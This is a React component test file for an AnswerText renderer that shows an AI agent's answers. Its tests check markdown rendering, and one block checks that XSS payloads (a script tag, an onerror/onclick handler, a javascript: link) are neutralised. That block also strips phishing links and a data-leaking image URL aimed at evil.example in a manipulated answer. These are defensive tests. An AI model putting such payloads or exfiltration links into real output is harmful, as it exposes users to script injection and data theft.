// @vitest-environment jsdom
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { AnswerText } from "@/components/Agent/AnswerText";

afterEach(cleanup);

describe("AnswerText", () => {
  it("shows plain text", () => {
    render(<AnswerText text="You owe $500 in the next 30 days." />);
    expect(screen.getByText("You owe $500 in the next 30 days.")).toBeTruthy();
  });

  it("shows a markdown table as a real table", () => {
    render(<AnswerText text={"| Vendor | Fee |\n|---|---|\n| Grand Oak Estate | $450 |\n| Lumen | $0 |"} />);
    expect(screen.getByRole("table")).toBeTruthy();
    expect(screen.getAllByRole("columnheader").map((c) => c.textContent)).toEqual(["Vendor", "Fee"]);
    expect(screen.getAllByRole("row")).toHaveLength(3);
    expect(screen.getByRole("cell", { name: "$450" })).toBeTruthy();
  });

  it("shows bold and lists", () => {
    const { container } = render(<AnswerText text={"**Total: $1,330**\n\n- first\n- second"} />);
    expect(container.querySelector("strong")?.textContent).toBe("Total: $1,330");
    expect(screen.getAllByRole("listitem").map((li) => li.textContent)).toEqual(["first", "second"]);
  });

  describe("never turns the model's text into live HTML", () => {
    it("shows raw HTML as text instead of running it", () => {
      const { container } = render(<AnswerText text={'Hello <script>alert(1)</script> <img src=x onerror="alert(2)"> <b onclick="x()">bold</b>'} />);
      expect(container.querySelector("script")).toBeNull();
      expect(container.querySelector("img")).toBeNull();
      expect(container.querySelector("b")).toBeNull();
      expect(container.querySelector("[onerror], [onclick]")).toBeNull(); // no element carries a handler
      expect(container.textContent).toContain("alert(1)"); // the markup is shown as harmless text
      expect(container.textContent).toContain('onerror="alert(2)"');
    });

    it("removes links, keeping their text, so a manipulated answer can't send the couple anywhere", () => {
      const { container } = render(<AnswerText text="Please [click here](https://evil.example/pay) or see <https://evil.example>." />);
      expect(container.querySelector("a")).toBeNull();
      expect(container.textContent).toContain("click here");
      expect(container.innerHTML).not.toContain("href");
    });

    it("removes images, so nothing can be loaded or used to leak data", () => {
      const { container } = render(<AnswerText text="![pixel](https://evil.example/track.png?data=secret)" />);
      expect(container.querySelector("img")).toBeNull();
      expect(container.innerHTML).not.toContain("evil.example");
    });

    it("does not run javascript: links", () => {
      const { container } = render(<AnswerText text="[x](javascript:alert(1))" />);
      expect(container.querySelector("a")).toBeNull();
      expect(container.innerHTML).not.toContain("javascript:");
    });
  });

  it("renders an empty answer without crashing", () => {
    expect(() => render(<AnswerText text="" />)).not.toThrow();
  });
});
